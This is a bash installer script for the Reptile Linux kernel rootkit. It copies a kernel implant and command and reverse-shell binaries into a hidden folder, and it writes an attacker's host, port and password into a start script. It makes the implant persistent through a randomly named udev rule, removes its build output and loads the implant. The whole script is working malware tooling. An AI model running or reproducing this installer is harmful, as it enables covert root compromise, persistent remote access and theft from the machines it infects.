#!/bin/bash

function random_gen_dec {
	RETVAL=$(shuf -i 50-99 -n 1)
}

PWD="$(cd "$(dirname ${BASH_SOURCE[0]})" && pwd)"
[ $? -ne 0 ] && PWD="$(cd "$(dirname $0)" && pwd)"
source "${BASH_SOURCE%/*}/../.config" || \
{ echo "Error: no .config file found!"; exit; }

UDEV_DIR=/lib/udev
random_gen_dec && NAME=$RETVAL-$HIDE.rules
RULE=/lib/udev/rules.d/$NAME
[ ! -d /lib/udev/rules.d ] && RULE=/etc/udev/rules.d/$NAME

# Create Reptile's folder
mkdir -p /$HIDE && \

# Copy "cmd" binary
cp $PWD/../output/cmd /$HIDE/$HIDE"_cmd" && \

# Copy "shell" binary
cp $PWD/../output/shell /$HIDE/$HIDE"_shell" && \

# Copy "bashrc"
cp $PWD/../scripts/bashrc /$HIDE/$HIDE"_rc" && \

# Create start script
cp $PWD/../scripts/start /$HIDE/$HIDE"_start" && \
sed -i s!XXXXX!$TAG_NAME! /$HIDE/$HIDE"_start" && \
sed -i s!\#CMD!/$HIDE/$HIDE"_cmd"! /$HIDE/$HIDE"_start" && \
if [ "$CONFIG_RSHELL_ON_START" == "y" ]; then
	sed -i s!\#SHELL!/$HIDE/$HIDE"_shell"! /$HIDE/$HIDE"_start" && \
	sed -i s!LHOST!$LHOST! /$HIDE/$HIDE"_start" && \
	sed -i s!LPORT!$LPORT! /$HIDE/$HIDE"_start" && \
	sed -i s!PASS!$PASSWORD! /$HIDE/$HIDE"_start" && \
	sed -i s!INTERVAL!$INTERVAL! /$HIDE/$HIDE"_start" && \
	true || false;
fi

# Permissions
chmod 777 /$HIDE/* && \

# Copy kernel implant
cp $PWD/../output/reptile /$HIDE/$HIDE && \

# Make persistent
cp $PWD/../output/reptile $UDEV_DIR/$HIDE && \
cp $PWD/../scripts/rule $RULE && \

# cleaning output dir
rm -rf $PWD/../output && \

# Load Reptile
/$HIDE/$HIDE && \

echo -e "\n\e[44;01;33m*** DONE! ***\e[00m\n" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }

# How to Uninstall
echo -e "UNINSTALL:\n"
echo -e "/$HIDE/$HIDE""_cmd show"
echo -e "rmmod reptile_module"
echo -e "rm -rf /$HIDE $RULE $UDEV_DIR/$HIDE"
echo